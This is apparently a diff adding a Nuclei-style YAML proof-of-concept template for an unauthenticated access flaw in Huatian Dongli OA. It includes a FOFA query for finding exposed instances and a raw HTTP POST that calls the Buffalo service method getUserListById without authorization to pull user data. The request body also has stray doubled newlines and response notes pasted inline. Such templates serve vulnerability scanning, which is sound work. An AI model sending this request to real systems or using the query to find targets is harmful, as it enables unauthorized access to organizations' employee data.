@@ -1,0 +1,19 @@
+id: poc-geu14aglinw0cswo
+info:
+  name: 华天动力OA办公系统存在未授权访问漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/geu14aglinw0cswo'
+  tags: unauth,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: geu14aglinw0cswo
+    fofa: app:"华天动力 OA"
+http:
+- raw:
+  - "POST /OAapp/bfapp/buffalo/hrApplicationFormService HTTP/1.1\n\nPragma: no-cache\n\nAccept: application/json, text/plain, */*\n\nCache-Control: no-cache\n\nContent-Type: text/xml;charset=utf-8\n\nAccept-Encoding: gzip, deflate, br\n\nAccept-Language: zh-CN,zh;q=0.9\n\nCookie: JSESSIONID=E23F65531C015A84CE70FBBEAFDA5296\n\nConnection: close\n\n\n\n   <buffalo-call>\n\n        <method>getUserListById</method>\n\n        <boolean>1</boolean>\n\n        <string></string>\n\n        <string>2</string>\n\n        <string></string>\n\n        <string></string>\n\n        <boolean>1</boolean>\n\n        <boolean>1</boolean>\n\n   </buffalo-call>\n\n# 响应代码特征\n200\n\n# 响应内容特征\nbuffalo-reply\n\n# 上传文件定位\n暂无"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
